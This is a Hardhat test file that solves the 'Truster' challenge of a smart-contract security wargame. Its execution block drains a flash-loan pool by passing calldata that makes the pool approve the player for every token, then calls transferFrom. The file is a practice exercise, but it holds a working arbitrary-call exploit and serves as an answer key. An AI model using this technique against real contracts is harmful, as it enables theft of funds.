const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /* 
            We can take a 0 token loan from the pool and pass data to make an unsafe low-level call to DVT contract
            In this unsafe low-level call to DVT contract we will approve player to spend all funds
            Immediately after, we will use our allowance to drain all tokens using transferFrom function.
        */
        
        let ABI = ["function approve(address to, uint256 amount)"];
        let iface = new ethers.utils.Interface(ABI);
        const data = iface.encodeFunctionData("approve", [
            player.address,
            TOKENS_IN_POOL,
        ]);
        await pool.flashLoan(0, player.address, token.address, data);
        await token
        .connect(player)
        .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

